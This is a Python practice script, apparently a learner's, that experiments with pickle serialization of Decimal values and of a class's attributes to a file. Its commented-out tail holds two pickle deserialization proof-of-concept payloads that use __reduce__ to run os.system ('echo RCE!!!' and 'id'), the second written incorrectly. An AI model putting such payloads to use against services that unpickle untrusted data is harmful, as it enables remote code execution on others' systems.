import pickle
import os
from decimal import Decimal

d = {'n1': Decimal('0.1'),
     'n2': float(0.1),
     'n3': Decimal(float(0.1))
     }

pData = pickle.dumps(d)
print(pData)

loadedD = pickle.loads(pData)
print(loadedD)

print('#'*10)
print()
print()
class INS:
    def __init__(self):
        self.var1 = 'text1'
        self.var2 = 'text2'
        self.var3 = 'text3'
        self.pickleList = ['var1', 'var2', 'var3']

    def aFunc(self):
        self.var1 = 'replaced text1'
        self.var2 = 'replaced text2'
        self.var3 = 'replaced text3'

    def _dumps(self):
        res = {}
        for var in self.pickleList:
            res[var] = getattr(self, var)

        return pickle.dumps(res)

    def _loads(self, pickledData):
        pickledData = pickle.loads(pickledData)
        for var in self.pickleList:
            setattr(self, var, pickledData[var])

    def toFile(self):
        with open('pickleTest.pickle', 'wb') as f:
            f.write(self._dumps())

    def fromFile(self):
        with open('pickleTest.pickle', 'rb') as f:
            self._loads(f.read())

    def printIns(self):
        for var in self.pickleList:
            print(var, ':', getattr(self, var))
        print()


ins1 = INS()
ins1.aFunc()
ins1Data = ins1._dumps()
print('ins1')
ins1.printIns()

ins2 = INS()
print('ins2')
ins2.printIns()

ins2._loads(ins1Data)

print('ins2')
ins2.printIns()

ins2.toFile()

print('ins3')
ins3 = INS()
ins3.fromFile()
ins3.printIns()

setattr(ins3, 'noKey', 'value') #error?
print(ins3.noKey) # good 쌉 간응



# class Vuln(object):
#     def __init__(self):
#         print("생성됨~")
#
#     def __reduce__(self):
#         return (os.system, ('echo RCE!!!',))
#
# print('피클하자~')
# pickle_data = pickle.dumps(Vuln())
# print('피클됨~')
#
# print('피클 불러오자~')
# ins = pickle.loads(pickle_data)
# print('피클 불러왔다~')


# import os
# import pickle
#
#
# class Vul:
#     def __init__(self):
#         self.me = 'me'
#
#     def __reduce__(self):
#         # return str(os.system('id', ))
#         print((os.system, ("id",)))
#         return tuple(os.system, tuple("id"))
#
#
# pi = pickle.dumps(Vul())
#
# res = pickle.loads(pi)
#
# print(res)
